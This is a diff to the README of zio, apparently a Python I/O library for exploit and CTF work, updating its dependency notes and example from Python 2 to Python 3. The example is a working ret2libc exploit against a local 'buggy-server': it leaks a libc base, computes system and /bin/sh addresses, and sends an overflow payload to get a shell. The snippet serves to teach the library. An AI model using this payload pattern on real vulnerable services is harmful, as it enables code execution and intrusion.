@@ -29,7 +29,7 @@ io.interact()
 ## Dependency
 
  - Linux or OSX
- - Python 2.6, 2.7
+ - Python 3.5+
  - termcolor (optional, for color support)
     - $ pip install termcolor
 
@@ -40,8 +40,8 @@ This is a single-file project so in most cases you can just download [zio.py](ht
 pip is also supported, so you can also install by running 
 
 ```bash
-$ pip2 install termcolor # for color support, optional
-$ pip2 install zio
+$ pip install termcolor # for color support, optional
+$ pip install zio
 ```
 
 ## Examples
@@ -51,18 +51,18 @@ from zio import *
 io = zio('./buggy-server')
 # io = zio((pwn.server, 1337))
 
-for i in xrange(1337):
+for i in range(1337):
     io.writeline('add ' + str(i))
     io.read_until('>>')
 
-io.write("add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + "A" * 49 + "\nshow\n")
-io.read_until('A' * 49)
+io.write(b"add TFpdp1gL4Qu4aVCHUF6AY5Gs7WKCoTYzPv49QSa\ninfo " + b"A" * 49 + b"\nshow\n")
+io.read_until(b'A' * 49)
 libc_base = l32(io.read(4)) - 0x1a9960
 libc_system = libc_base + 0x3ea70
 libc_binsh = libc_base + 0x15fcbf
-payload = 'A' * 64 + l32(libc_system) + 'JJJJ' + l32(libc_binsh)
-io.write('info ' + payload + "\nshow\nexit\n")
-io.read_until(">>")
+payload = b'A' * 64 + l32(libc_system) + b'JJJJ' + l32(libc_binsh)
+io.write(b'info ' + payload + b"\nshow\nexit\n")
+io.read_until(b">>")
 # We've got a shell;-)
 io.interact()
 ```
